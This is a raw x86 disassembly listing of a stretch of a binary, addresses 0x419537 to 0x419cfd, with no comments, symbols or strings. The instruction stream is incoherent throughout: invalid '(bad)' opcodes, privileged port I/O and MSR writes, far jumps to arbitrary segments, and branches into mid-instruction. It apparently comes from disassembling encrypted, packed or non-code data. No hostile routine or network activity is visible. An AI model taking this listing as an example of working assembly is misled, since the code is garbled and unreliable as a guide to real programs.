  419537:	stos   BYTE PTR es:[edi],al
  419538:	or     DWORD PTR ds:0xff563166,0xffffffc9
  41953f:	jo     0x4195b9
  419541:	cmp    BYTE PTR [esi-0x62],bl
  419544:	jae    0x4195b9
  419546:	lds    ebx,FWORD PTR [esp+eax*1+0x4d]
  41954a:	cdq    
  41954b:	rol    edx,cl
  41954d:	lahf   
  41954e:	jbe    0x419582
  419550:	je     0x4195c8
  419552:	retf   0xd937
  419555:	push   0x73
  419557:	retf   
  419558:	or     al,0x75
  41955a:	xor    al,0x15
  41955c:	dec    eax
  41955d:	std    
  41955e:	sbb    esi,DWORD PTR [edi]
  419560:	shl    esi,1
  419562:	inc    edi
  419563:	or     BYTE PTR [edx-0x2eb4e2ea],0xe
  41956a:	data16 loope 0x4195ba
  41956d:	xor    BYTE PTR [edx-0x1e],ch
  419570:	outs   dx,DWORD PTR ds:[esi]
  419571:	es mov ah,0x16
  419574:	out    dx,eax
  419575:	test   eax,0xc4b1a744
  41957a:	mov    bl,bh
  41957c:	fstp   TBYTE PTR [edx+ebx*2]
  41957f:	fcomp  QWORD PTR [esi+esi*2+0x68]
  419583:	ins    DWORD PTR es:[edi],dx
  419584:	cmp    eax,0xcd51c96
  419589:	out    dx,al
  41958a:	lahf   
  41958b:	stos   DWORD PTR es:[edi],eax
  41958c:	add    al,0xe9
  41958e:	push   es
  41958f:	push   0xa11437d0
  419594:	clc    
  419595:	faddp  st(4),st
  419597:	xor    dh,cl
  419599:	int    0x3f
  41959b:	pop    ds
  41959c:	mov    eax,0x94fa211b
  4195a1:	add    esi,DWORD PTR [esi]
  4195a3:	out    dx,eax
  4195a4:	xchg   ebp,eax
  4195a5:	(bad)  
  4195a6:	and    cl,BYTE PTR [ecx]
  4195a8:	idiv   DWORD PTR [ecx]
  4195aa:	scas   al,BYTE PTR es:[edi]
  4195ab:	ja     0x4195af
  4195ad:	adc    bh,BYTE PTR [eax]
  4195af:	xlat   BYTE PTR ds:[ebx]
  4195b0:	sbb    eax,0xc5af2198
  4195b5:	call   0x917be793
  4195ba:	rdtsc  
  4195bc:	cmc    
  4195bd:	daa    
  4195be:	adc    DWORD PTR [eax],ebp
  4195c0:	aaa    
  4195c1:	inc    ebp
  4195c2:	je     0x41959f
  4195c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195c5:	pop    es
  4195c6:	das    
  4195c7:	jo     0x419557
  4195c9:	in     al,dx
  4195ca:	mov    esi,0x78f18a33
  4195cf:	adc    esp,0x6de9f750
  4195d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d6:	push   ds
  4195d7:	adc    edi,DWORD PTR [edx]
  4195d9:	push   cs
  4195da:	mov    eax,0xdcae3491
  4195df:	pop    ebp
  4195e0:	jb     0x4195f4
  4195e2:	out    dx,al
  4195e3:	xor    DWORD PTR [edi-0x1],0xcf45ff08
  4195ea:	sub    BYTE PTR [eax+0x6b],ah
  4195ed:	mov    dh,0xcd
  4195ef:	mov    edx,0x2284e3cb
  4195f4:	jmp    0xc9a96ea5
  4195f9:	or     ecx,DWORD PTR [ebx+0xc508732]
  4195ff:	cmp    edi,esi
  419601:	push   ecx
  419602:	mov    ebp,0x7a52a636
  419607:	or     esp,DWORD PTR [edi]
  419609:	mov    DWORD PTR [edx+0x2c],edx
  41960c:	sub    DWORD PTR [edi+edx*8+0x67c20a2],0x23
  419614:	sub    bh,BYTE PTR [edx-0x6c16b98b]
  41961a:	mov    edx,0x3f8765bd
  41961f:	dec    edi
  419620:	bound  esi,QWORD PTR es:[ebx]
  419623:	scas   eax,DWORD PTR es:[edi]
  419624:	mov    edx,0xa4e2c337
  419629:	push   es
  41962a:	mov    edx,0x4219b65a
  41962f:	pop    es
  419630:	sub    BYTE PTR [edx],dh
  419632:	add    BYTE PTR [eax-0x3996f859],cl
  419638:	stos   BYTE PTR es:[edi],al
  419639:	cs mov edx,0x5295fe0c
  41963f:	js     0x419607
  419641:	mov    eax,DWORD PTR [ebp-0x37ed7c66]
  419647:	sub    al,0xb7
  419649:	push   eax
  41964a:	mov    ch,0x5
  41964c:	dec    eax
  41964d:	add    al,0x27
  41964f:	test   al,0xe8
  419651:	jne    0x41966e
  419653:	loopne 0x419624
  419655:	shr    DWORD PTR [ecx-0x55],cl
  419658:	lahf   
  419659:	fucom  st(5)
  41965b:	mov    DWORD PTR [edx-0x524e74e4],ebx
  419661:	mov    ebp,0x46896a4
  419666:	xlat   BYTE PTR ds:[ebx]
  419667:	xchg   DWORD PTR [ecx],esp
  419669:	fsubr  QWORD PTR [eax]
  41966b:	mov    ch,ch
  41966d:	mov    ebp,0x4aeac029
  419672:	outs   dx,DWORD PTR ds:[esi]
  419673:	dec    ecx
  419674:	bound  esp,QWORD PTR [ebx+0x46]
  419677:	ret    
  419678:	in     eax,0x82
  41967a:	and    eax,0x9afe2eb1
  41967f:	mov    DWORD PTR [edx+0x6ca55d99],esi
  419685:	and    DWORD PTR [esi-0x7f],eax
  419688:	fs cmp esp,ebx
  41968b:	jmp    0x4196aa
  41968d:	movzx  esp,BYTE PTR [edi-0x295edc82]
  419694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419695:	or     DWORD PTR [edi-0x14eeaed4],ebx
  41969b:	mov    ds:0xb2affe61,al
  4196a0:	sub    al,0xbc
  4196a2:	fnstenv [edi+0x3b]
  4196a5:	pop    eax
  4196a6:	mov    eax,DWORD PTR [esi+0x57]
  4196a9:	and    BYTE PTR [esi-0x534d8a4b],0xd
  4196b0:	jecxz  0x419634
  4196b2:	adc    eax,0x9092fcee
  4196b7:	mov    bl,0x84
  4196b9:	es sbb ah,bh
  4196bc:	addr16 mov bl,0x74
  4196bf:	aad    0xa4
  4196c1:	jge    0x4196a8
  4196c3:	sbb    eax,0x132605e1
  4196c9:	push   ebp
  4196ca:	or     al,0x5f
  4196cc:	mov    edx,0x4f3f95e6
  4196d1:	adc    eax,0x4af7efe0
  4196d6:	mov    dh,0x8b
  4196d8:	cld    
  4196d9:	pop    edx
  4196da:	add    al,0x93
  4196dc:	mov    dh,0xa
  4196df:	in     al,dx
  4196e0:	xchg   edx,eax
  4196e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196e2:	pop    eax
  4196e3:	test   eax,0x4f12ef50
  4196e8:	in     eax,0x98
  4196ea:	xchg   ebx,eax
  4196eb:	jbe    0x419708
  4196ed:	inc    esp
  4196ee:	in     al,0xc8
  4196f0:	jl     0x419758
  4196f2:	retf   0x69a0
  4196f5:	mov    dl,0x16
  4196f7:	mov    ds:0xd3ee048,eax
  4196fc:	imul   esp,eax,0xffffffce
  4196ff:	push   eax
  419700:	sbb    BYTE PTR [eax+esi*8],ch
  419703:	fmul   st,st(1)
  419705:	pusha  
  419706:	fwait
  419707:	add    BYTE PTR [ecx+0x2bdbca7b],al
  41970d:	in     al,dx
  41970e:	add    ebp,edi
  419710:	or     DWORD PTR [edi-0x79],esp
  419713:	aas    
  419714:	xchg   BYTE PTR [ebp-0x6bc0b580],al
  41971a:	hlt    
  41971b:	out    0xcc,eax
  41971d:	cmp    eax,0x4a891b1c
  419722:	das    
  419723:	ins    BYTE PTR es:[edi],dx
  419724:	(bad)  
  419726:	mov    dh,0xe4
  419728:	sbb    BYTE PTR [edi-0x2b],al
  41972b:	(bad)  [esi]
  41972d:	push   cs
  41972e:	add    ebp,DWORD PTR [ebp+0x54]
  419731:	fmul   DWORD PTR [esi-0x11]
  419734:	sti    
  419735:	out    0x14,al
  419737:	outs   dx,DWORD PTR ds:[esi]
  419738:	ret    
  419739:	cmp    eax,0x99499e8b
  41973e:	mov    BYTE PTR [ebp-0x54],ch
  419741:	xor    DWORD PTR [esi-0x57],edx
  419744:	mov    gs,WORD PTR [ecx]
  419746:	pop    ebp
  419747:	push   ebp
  419748:	mov    bl,0xf5
  41974a:	xor    edx,ebx
  41974c:	leave  
  41974d:	dec    eax
  41974e:	dec    ebx
  41974f:	mov    bh,0x86
  419751:	push   es
  419752:	sbb    esi,DWORD PTR [edx+ebx*8]
  419755:	cmp    bl,al
  419757:	cmp    DWORD PTR [esi-0x5555770],esp
  41975d:	fist   DWORD PTR fs:[esi]
  419760:	faddp  st(5),st
  419762:	cli    
  419763:	xor    ch,BYTE PTR [esi+ebx*2]
  419766:	and    ecx,0x76
  419769:	dec    ecx
  41976a:	pop    ds
  41976b:	and    al,0x6e
  41976d:	(bad)  
  41976e:	pusha  
  41976f:	push   es
  419770:	(bad)  
  419771:	pop    esp
  419772:	stc    
  419773:	ror    BYTE PTR [ebx],1
  419775:	jnp    0x4197e2
  419777:	je     0x41975a
  419779:	popa   
  41977a:	fmul   QWORD PTR [edx+esi*1-0x3d08e713]
  419781:	fild   QWORD PTR [ecx-0x7519ae6e]
  419787:	imul   esi,DWORD PTR [edi+0x9],0x54
  41978b:	imul   edi,DWORD PTR [ebx+0x25b3051e],0x9cdcafbc
  419795:	xchg   edx,eax
  419796:	aam    0x5d
  419798:	lsl    edx,WORD PTR [ebx]
  41979b:	and    al,0x56
  41979d:	wrmsr  
  41979f:	mov    bl,0xce
  4197a1:	adc    BYTE PTR [eax+0x55],bh
  4197a4:	stos   BYTE PTR es:[edi],al
  4197a5:	push   es
  4197a6:	in     al,dx
  4197a7:	pushf  
  4197a8:	pop    ecx
  4197a9:	dec    esp
  4197aa:	add    ch,BYTE PTR [esi]
  4197ac:	mov    ah,0x43
  4197ae:	rcl    DWORD PTR ds:[bp+si-0x37],1
  4197b3:	dec    edx
  4197b4:	outs   dx,BYTE PTR ds:[esi]
  4197b5:	sbb    cl,BYTE PTR [ebx]
  4197b7:	fwait
  4197b8:	mov    edx,0x2f1f4ef4
  4197bd:	test   BYTE PTR [esi+0x1c730b99],al
  4197c3:	repz pop ss
  4197c5:	dec    esi
  4197c6:	(bad)  
  4197c7:	je     0x419818
  4197c9:	or     esi,DWORD PTR [edi+eax*1+0x4d8d8305]
  4197d0:	out    0xbb,al
  4197d2:	or     al,0xd0
  4197d4:	mov    al,0x32
  4197d6:	lods   al,BYTE PTR ds:[esi]
  4197d7:	out    0xd2,eax
  4197d9:	inc    ebx
  4197da:	dec    esp
  4197db:	push   eax
  4197dc:	out    dx,al
  4197dd:	inc    ebx
  4197de:	cmp    DWORD PTR [ebx+0x2fc0b6b8],edx
  4197e4:	sahf   
  4197e5:	add    al,0x5f
  4197e7:	mov    bh,0x2
  4197e9:	add    BYTE PTR [ebp+0x61dcae46],ah
  4197ef:	dec    ebp
  4197f0:	xor    eax,0x6e
  4197f3:	mov    ah,0xe8
  4197f5:	mov    eax,0x74bce49e
  4197fa:	mov    ecx,0xde87853f
  4197ff:	hlt    
  419800:	std    
  419801:	aas    
  419802:	pop    ss
  419803:	push   es
  419804:	in     eax,dx
  419805:	loope  0x4197fb
  419807:	mov    ds:0xca9bcf13,eax
  41980c:	cmp    BYTE PTR [ebp+ebx*8-0x1743099c],0xb7
  419814:	leave  
  419815:	xchg   ebp,eax
  419816:	pop    ebx
  419817:	jae    0x4197e9
  419819:	scas   eax,DWORD PTR es:[edi]
  41981a:	cld    
  41981b:	jbe    0x41986a
  41981d:	jo     0x4197ae
  41981f:	or     eax,ecx
  419821:	test   eax,0x2f30370f
  419826:	jl     0x419866
  419828:	dec    edx
  419829:	popa   
  41982a:	sub    ah,dh
  41982c:	loop   0x41983e
  41982e:	movzx  ecx,WORD PTR [esi]
  419831:	xchg   esp,eax
  419832:	inc    ecx
  419833:	mov    eax,DWORD PTR [eax-0x3c]
  419836:	loopne 0x419849
  419838:	jno    0x419807
  41983a:	cmp    edx,DWORD PTR [ebx-0x280e0bbc]
  419840:	ss imul edx,eax,0xffffffbb
  419844:	and    BYTE PTR [eax],cl
  419846:	imul   esi,ebp,0xe
  419849:	dec    esp
  41984a:	mov    ss,ebp
  41984c:	shl    DWORD PTR [edi+ecx*8],1
  41984f:	xor    DWORD PTR [ebx-0x4ed8631f],ebx
  419855:	std    
  419856:	pop    esp
  419857:	shl    edx,1
  419859:	test   eax,0x4419c66d
  41985e:	popa   
  41985f:	fwait
  419860:	add    al,0x34
  419862:	shl    DWORD PTR [edi+0x25bd025d],0x2c
  419869:	cmc    
  41986a:	pop    es
  41986b:	jmp    0x2f11:0xef38c5c
  419872:	in     eax,0xd7
  419874:	mul    DWORD PTR [eax+ecx*4]
  419877:	leave  
  419878:	adc    bl,BYTE PTR [ebx+0x24be7727]
  41987e:	ret    0x8ae7
  419881:	popa   
  419882:	iret   
  419883:	inc    ebx
  419884:	cdq    
  419885:	cmp    eax,DWORD PTR [edx-0x460621c7]
  41988b:	push   cs
  41988c:	jp     0x419888
  41988e:	xchg   ebx,eax
  41988f:	pop    ds
  419890:	clc    
  419891:	pop    ss
  419892:	add    al,0x17
  419894:	lahf   
  419895:	add    DWORD PTR ds:0x63fada40,esp
  41989b:	push   ds
  41989c:	sub    BYTE PTR [edi],cl
  41989e:	je     0x4198f9
  4198a0:	xchg   BYTE PTR [esi-0x42],bh
  4198a3:	or     eax,0xd143f6d1
  4198a8:	jecxz  0x419884
  4198aa:	push   ss
  4198ab:	sbb    bl,BYTE PTR [edx]
  4198ad:	xchg   edi,eax
  4198ae:	mov    dh,0xad
  4198b0:	sub    eax,0x97f6f14d
  4198b5:	aaa    
  4198b6:	adc    al,0xb
  4198b8:	mov    esp,0x9a17d738
  4198bd:	push   ecx
  4198be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198bf:	pop    esp
  4198c0:	sahf   
  4198c1:	(bad)
  4198c6:	jp     0x4198cf
  4198c8:	aam    0x66
  4198ca:	in     al,dx
  4198cb:	pop    edi
  4198cc:	jo     0x4198a0
  4198ce:	test   BYTE PTR [ecx],dl
  4198d0:	retw   
  4198d2:	and    al,0xb8
  4198d4:	xlat   BYTE PTR ds:[ebx]
  4198d5:	xchg   BYTE PTR [ebx+edx*8],ch
  4198d8:	mov    eax,0x5b67cfd3
  4198dd:	stos   DWORD PTR es:[edi],eax
  4198de:	out    dx,eax
  4198df:	sbb    ecx,DWORD PTR [esi+ecx*8]
  4198e2:	push   ds
  4198e3:	test   DWORD PTR [ecx+0x42f37c1c],eax
  4198e9:	lds    ebx,FWORD PTR [edi-0x26]
  4198ec:	fild   WORD PTR [esi+edx*1-0x2a297793]
  4198f3:	mov    eax,ds:0x727133d3
  4198f8:	ret    
  4198f9:	mov    esp,0x4c1c89e0
  4198fe:	sub    eax,0xe60dea7f
  419903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419904:	ret    0xd3aa
  419907:	(bad)
  41990a:	xchg   edx,eax
  41990b:	pop    ss
  41990c:	add    DWORD PTR [eax+ecx*1],esp
  41990f:	retf   0x25d
  419912:	jmp    0x715f:0x7d06e62e
  419919:	fs jo  0x41995c
  41991c:	outs   dx,BYTE PTR ds:[esi]
  41991d:	out    0x53,al
  41991f:	mov    ebp,0x9b4a6719
  419924:	inc    ecx
  419925:	cs cs jo 0x4198e5
  419929:	sub    esi,DWORD PTR [esi]
  41992b:	shl    DWORD PTR [ecx-0xb516f0d],cl
  419931:	enter  0xe50c,0x4f
  419935:	jno    0x41993d
  419937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419938:	jns    0x419913
  41993a:	fwait
  41993b:	fs jmp 0xfe8edea7
  419941:	outs   dx,BYTE PTR ds:[esi]
  419942:	adc    edi,DWORD PTR [ebx]
  419944:	xchg   DWORD PTR [edx+0x7ef5972f],ecx
  41994a:	retf   
  41994b:	int3   
  41994c:	out    dx,eax
  41994d:	cmp    cl,dh
  41994f:	jecxz  0x4198d7
  419951:	(bad)  
  419952:	mov    bl,bl
  419954:	rol    BYTE PTR [eax],1
  419956:	and    eax,0xef177bc4
  41995b:	mov    eax,ds:0x86dc5d5e
  419960:	inc    esp
  419961:	or     edi,DWORD PTR [eax+ebx*1]
  419964:	inc    ebx
  419965:	div    DWORD PTR [edi]
  419967:	pop    es
  419968:	cmp    esp,edi
  41996a:	(bad)  
  41996b:	out    dx,eax
  41996c:	out    0xbc,al
  41996e:	int3   
  41996f:	gs mov al,0xde
  419972:	xchg   edx,eax
  419973:	sbb    bl,bh
  419975:	pop    ebx
  419976:	push   ebp
  419977:	xor    BYTE PTR [esi],0xcc
  41997a:	call   0x359a1c8
  41997f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419980:	sub    ecx,DWORD PTR [esi+0x51]
  419983:	aam    0xf1
  419985:	test   al,0x7b
  419987:	mov    ch,0xf5
  419989:	lods   eax,DWORD PTR ds:[esi]
  41998a:	(bad)  [esi+0x3c60db51]
  419990:	(bad)  
  419991:	div    BYTE PTR [eax]
  419993:	loopne 0x41992f
  419995:	push   ecx
  419996:	and    al,0xc0
  419998:	xchg   DWORD PTR [edx+0x5c],ebx
  41999b:	cmp    bh,bh
  41999d:	and    al,0xf5
  41999f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199a0:	and    BYTE PTR [ecx-0x1ac44d7a],0x8a
  4199a7:	nop
  4199a8:	pop    ds
  4199a9:	repnz hlt 
  4199ab:	add    edi,DWORD PTR [ecx+0xe7ea1d8]
  4199b1:	in     eax,dx
  4199b2:	push   ebx
  4199b3:	aad    0xd2
  4199b5:	xor    DWORD PTR [eax-0x697c3500],edx
  4199bb:	mov    ebp,0x3b422090
  4199c0:	jae    0x419a41
  4199c2:	mov    ebx,gs
  4199c4:	push   edi
  4199c5:	pushf  
  4199c6:	fdivr  st,st(6)
  4199c8:	mov    ecx,0xe7447c75
  4199cd:	into   
  4199ce:	das    
  4199cf:	lds    ebx,FWORD PTR [ebx-0x3d151ea8]
  4199d5:	mov    ds:0x3b6a7230,eax
  4199da:	xor    DWORD PTR [ecx+0x48],ebp
  4199dd:	mov    ds:0x8d45a7b5,eax
  4199e2:	mov    ch,0xfc
  4199e4:	cli    
  4199e5:	xor    al,0x28
  4199e7:	retf   0x5463
  4199ea:	aaa    
  4199eb:	fmul   QWORD PTR [edx+0x14b2ca85]
  4199f1:	cmp    DWORD PTR [ebx-0x21aa3f6f],esp
  4199f7:	iret   
  4199f8:	sub    esi,esi
  4199fa:	test   DWORD PTR [esi+0x45],0x961e829e
  419a01:	out    0xa5,eax
  419a03:	imul   esi,ecx,0xf16cd2a4
  419a09:	add    BYTE PTR [edi-0x10b2779],0xdb
  419a10:	xor    al,0x6c
  419a12:	mov    gs,WORD PTR ds:[eax]
  419a15:	or     esp,0x375fc671
  419a1b:	mov    ch,0x24
  419a1d:	cmp    DWORD PTR [eax+0x3737a616],edx
  419a23:	pop    esi
  419a24:	mov    ebx,0xef6d6882
  419a29:	sahf   
  419a2a:	fstp   QWORD PTR [eax+0x4456ba54]
  419a30:	add    eax,0x100c5fa3
  419a35:	push   ebx
  419a36:	or     al,dl
  419a38:	(bad)  [esi]
  419a3a:	xchg   BYTE PTR [ecx],dh
  419a3c:	xchg   esp,eax
  419a3d:	gs mov edx,0x261837a2
  419a43:	stos   DWORD PTR es:[edi],eax
  419a44:	sub    esi,esp
  419a46:	xlat   BYTE PTR ds:[ebx]
  419a47:	loop   0x419a02
  419a49:	push   cs
  419a4a:	inc    esi
  419a4b:	arpl   ax,sp
  419a4d:	cld    
  419a4e:	mov    DWORD PTR [eax-0x10],esi
  419a51:	pop    ebx
  419a52:	xlat   BYTE PTR ds:[ebx]
  419a53:	clc    
  419a54:	pusha  
  419a55:	(bad)  
  419a56:	dec    ebp
  419a57:	(bad)  
  419a58:	popf   
  419a59:	mov    ebx,0xd0579258
  419a5e:	mov    WORD PTR [edi+0x5f],es
  419a61:	mov    edx,0x31dc11ef
  419a66:	(bad)  
  419a67:	stos   DWORD PTR es:[edi],eax
  419a68:	jp     0x4199ff
  419a6a:	into   
  419a6b:	mov    ecx,0xeaefc354
  419a70:	pop    ebx
  419a71:	pushf  
  419a72:	push   ss
  419a73:	fist   DWORD PTR [ecx+0x74]
  419a76:	pop    edi
  419a77:	mov    ecx,0x2897d8e2
  419a7c:	(bad)  
  419a7d:	es jb  0x419a9a
  419a80:	adc    al,0x52
  419a82:	mov    ds:0x55058ad1,al
  419a87:	or     edi,esp
  419a89:	lods   eax,DWORD PTR ds:[esi]
  419a8a:	cmp    ah,BYTE PTR [ecx]
  419a8c:	rol    DWORD PTR [eax],1
  419a8e:	and    BYTE PTR [edi-0x3a],al
  419a91:	and    esp,DWORD PTR [ebp+0x52]
  419a94:	mov    WORD PTR [ebp+0xda8e736],fs
  419a9a:	or     eax,DWORD PTR [esi+0x5a]
  419a9d:	ret    
  419a9e:	add    DWORD PTR ds:0xb40f132b,ecx
  419aa4:	clc    
  419aa5:	lods   al,BYTE PTR es:[esi]
  419aa7:	push   ecx
  419aa8:	fsubrp st(4),st
  419aaa:	pop    es
  419aab:	dec    esi
  419aac:	dec    ebx
  419aad:	push   eax
  419aae:	std    
  419aaf:	mov    WORD PTR [esi],ss
  419ab1:	mov    edx,0x96c908dd
  419ab6:	mov    eax,ds:0xbcd9434c
  419abb:	repz je 0x419a67
  419abe:	jmp    DWORD PTR [eax-0x3e]
  419ac1:	dec    edx
  419ac2:	pusha  
  419ac3:	popf   
  419ac4:	jle    0x419ae6
  419ac6:	adc    bl,BYTE PTR [edx+0x2d]
  419ac9:	mov    dh,0x86
  419acb:	sbb    cl,dh
  419acd:	push   edi
  419ace:	push   0xffffffe3
  419ad0:	jns    0x419ad9
  419ad2:	aam    0xb3
  419ad4:	ja     0x419b50
  419ad6:	add    al,0xeb
  419ad8:	into   
  419ad9:	js     0x419b31
  419adb:	inc    esp
  419adc:	enter  0x9987,0xe3
  419ae0:	out    0xe0,al
  419ae2:	and    DWORD PTR [ecx+0x64],edx
  419ae5:	test   al,0xd2
  419ae7:	(bad)  
  419ae8:	retf   0xda22
  419aeb:	cs jp  0x419b5f
  419aee:	repz (bad) 
  419af0:	sti    
  419af1:	(bad)  
  419af2:	(bad)  [edx-0x209df35d]
  419af8:	adc    dl,BYTE PTR [ebp-0x3bc67f26]
  419afe:	or     dh,dl
  419b00:	sub    ecx,eax
  419b02:	fimul  WORD PTR [esi-0xa]
  419b05:	mov    ch,0x49
  419b07:	and    dh,BYTE PTR cs:[edx+0x70]
  419b0b:	ss jb  0x419aad
  419b0e:	cli    
  419b0f:	frstor [ebx+0x4cc9e14b]
  419b15:	xor    ecx,eax
  419b17:	xor    ecx,DWORD PTR [edi]
  419b19:	pop    edx
  419b1a:	mov    ds:0x81ee4b33,al
  419b1f:	adc    dl,BYTE PTR [esi+eax*1]
  419b22:	mov    al,ds:0xff3df46a
  419b27:	sbb    BYTE PTR [eax+0x5e],cl
  419b2a:	sbb    ebx,esp
  419b2c:	xchg   DWORD PTR [ecx-0x61],edx
  419b2f:	mov    al,ds:0xc8f36594
  419b34:	pop    ebp
  419b35:	pop    esi
  419b36:	test   ebx,edx
  419b38:	or     esi,DWORD PTR [esi+ebp*1+0x7e8fb18d]
  419b3f:	test   BYTE PTR [ebp-0xcaa3aba],dh
  419b45:	jecxz  0x419b24
  419b47:	inc    eax
  419b48:	mov    cl,0x6a
  419b4a:	pop    edi
  419b4b:	pop    eax
  419b4c:	fwait
  419b4d:	in     al,dx
  419b4e:	pop    edi
  419b4f:	push   edx
  419b50:	xor    BYTE PTR [edi-0x2bcf32a4],ah
  419b56:	adc    DWORD PTR [ecx],0x42eb4581
  419b5c:	rcr    DWORD PTR [eax],0x56
  419b5f:	inc    esi
  419b60:	xor    al,0x81
  419b62:	sbb    ecx,DWORD PTR [esi-0x2b9355f6]
  419b68:	(bad)
  419b6c:	adc    dh,BYTE PTR [edx-0x36]
  419b6f:	loopne 0x419b21
  419b71:	les    esp,FWORD PTR [ebx+0x29e079b5]
  419b77:	sub    al,0x31
  419b79:	sahf   
  419b7a:	pop    ecx
  419b7b:	and    ah,BYTE PTR [ebx]
  419b7d:	arpl   WORD PTR [ecx],bx
  419b7f:	inc    edi
  419b80:	mov    edx,0xbd7d2ff1
  419b85:	popf   
  419b86:	inc    edi
  419b87:	loopne 0x419bd5
  419b89:	in     eax,dx
  419b8a:	test   DWORD PTR [esi-0x74fa1f2b],esp
  419b90:	stos   BYTE PTR es:[edi],al
  419b91:	push   ds
  419b92:	sahf   
  419b93:	test   BYTE PTR [ecx],0x22
  419b96:	mov    al,0xef
  419b98:	xchg   ebx,eax
  419b99:	pop    edx
  419b9a:	and    al,BYTE PTR [esi]
  419b9c:	clc    
  419b9d:	push   ebx
  419b9e:	cli    
  419b9f:	cld    
  419ba0:	xchg   esi,eax
  419ba1:	js     0x419b4f
  419ba3:	adc    DWORD PTR [edx],ebp
  419ba5:	cmp    eax,0x61c83415
  419baa:	mov    edi,0xc444eda1
  419baf:	push   eax
  419bb0:	leave  
  419bb1:	(bad)  
  419bb2:	in     eax,dx
  419bb3:	dec    esi
  419bb4:	jg     0x419bb0
  419bb6:	ds xor al,0x36
  419bb9:	(bad)  
  419bbb:	sub    BYTE PTR [ecx],bh
  419bbd:	push   esp
  419bbe:	je     0x419b92
  419bc0:	pop    ebp
  419bc1:	push   es
  419bc2:	in     eax,dx
  419bc3:	ins    BYTE PTR es:[edi],dx
  419bc4:	test   eax,0xf04aec3d
  419bc9:	outs   dx,DWORD PTR ds:[esi]
  419bca:	xchg   BYTE PTR [esi+0x3a5c5c09],bh
  419bd0:	psllq  mm4,mm1
  419bd3:	push   eax
  419bd4:	sti    
  419bd5:	sti    
  419bd6:	xchg   esi,eax
  419bd7:	int3   
  419bd8:	sbb    DWORD PTR [edx-0x4ceee06e],edx
  419bde:	call   0x1452ef9b
  419be3:	je     0x419bc9
  419be5:	in     al,0x7e
  419be7:	dec    ebp
  419be8:	call   0xdbb3:0xf103cb2
  419bef:	out    0x50,al
  419bf1:	int3   
  419bf2:	fisub  WORD PTR [ebp+0x699e6282]
  419bf8:	popf   
  419bf9:	stos   BYTE PTR es:[edi],al
  419bfa:	add    DWORD PTR [edi],ebx
  419bfc:	in     al,0x11
  419bfe:	mov    bl,0x3b
  419c00:	push   edi
  419c01:	mov    bl,BYTE PTR [edi+edi*2]
  419c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c05:	dec    ebp
  419c06:	mov    dl,BYTE PTR [edx+0x78]
  419c09:	sbb    ah,al
  419c0b:	sbb    eax,0xc8d73c1b
  419c10:	ja     0x419b96
  419c12:	push   ebx
  419c13:	cmp    eax,0x6ea43536
  419c18:	mov    dh,0x2a
  419c1a:	jb     0x419bdf
  419c1c:	loop   0x419c92
  419c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c1f:	adc    eax,0xabc2b7fa
  419c24:	shr    dh,1
  419c26:	scas   eax,DWORD PTR es:[edi]
  419c27:	pop    ds
  419c28:	inc    edx
  419c29:	xor    ebx,DWORD PTR [edi+eax*1-0x51]
  419c2d:	mov    al,ds:0x1a3d27ed
  419c32:	frstor [ecx]
  419c34:	mov    cs:0xacc9a59d,al
  419c3a:	mov    ch,0x1f
  419c3c:	push   edi
  419c3d:	jo     0x419c21
  419c3f:	outs   dx,DWORD PTR ds:[si]
  419c41:	and    al,ah
  419c43:	pop    esp
  419c44:	ret    0xccfd
  419c47:	and    ebx,DWORD PTR [ebp+eax*4+0x3d]
  419c4b:	inc    ebx
  419c4c:	adc    eax,esp
  419c4e:	jg     0x419c47
  419c50:	or     al,0x3f
  419c52:	sbb    BYTE PTR [ebp+0x671c836a],0x51
  419c59:	push   ds
  419c5a:	test   edi,eax
  419c5c:	int    0x37
  419c5e:	popa   
  419c5f:	leave  
  419c60:	cmp    al,0x1e
  419c62:	aam    0x1b
  419c64:	or     al,0x0
  419c66:	adc    edi,DWORD PTR [esi]
  419c68:	mov    dh,0xe1
  419c6a:	xor    WORD PTR ds:0xf80eeb98,0x56b2
  419c73:	mov    WORD PTR [ebx+ebp*1+0x55e3327e],?
  419c7a:	sub    BYTE PTR [eax-0x49],al
  419c7d:	push   0x1bb505cd
  419c82:	pop    ss
  419c83:	jne    0x419ce9
  419c85:	mov    edi,0x4a1271d3
  419c8a:	pop    eax
  419c8b:	sbb    eax,0x27878747
  419c90:	cmp    dh,BYTE PTR [edx+0x62b4ebc0]
  419c96:	dec    ecx
  419c97:	jmp    0x7143:0xf180ade
  419c9e:	lods   eax,DWORD PTR ds:[esi]
  419c9f:	push   ebx
  419ca0:	adc    al,0xc2
  419ca2:	mov    ds:0x4a6a279,eax
  419ca7:	iret   
  419ca8:	dec    eax
  419ca9:	push   esp
  419caa:	add    edi,0x7f
  419cad:	cld    
  419cae:	xor    DWORD PTR ds:0x7931c09b,edx
  419cb4:	push   edi
  419cb5:	gs jns 0x419d2f
  419cb8:	mov    ecx,0xd207f6dd
  419cbd:	mov    ah,0xf6
  419cbf:	push   eax
  419cc0:	inc    eax
  419cc1:	dec    esi
  419cc2:	jmp    0x419d25
  419cc4:	or     al,BYTE PTR [eax-0x1d995573]
  419cca:	sbb    ch,dl
  419ccc:	jge    0x419ccd
  419cce:	sub    al,0x28
  419cd0:	jecxz  0x419cad
  419cd2:	arpl   WORD PTR [edx+0x6e6889fa],si
  419cd8:	add    BYTE PTR [edx+0x45],bl
  419cdb:	sbb    eax,0xce704dd0
  419ce0:	lds    ecx,FWORD PTR [eax-0x6e635c98]
  419ce6:	test   ah,bh
  419ce8:	aaa    
  419ce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cea:	fdiv   st,st(0)
  419cec:	jns    0x419cd6
  419cee:	loope  0x419cab
  419cf0:	iret   
  419cf1:	lods   al,BYTE PTR ds:[esi]
  419cf2:	dec    esi
  419cf3:	daa    
  419cf4:	and    al,0xac
  419cf6:	out    0x29,al
  419cf8:	mov    esp,0x602aa645
  419cfd:	and    bh,al
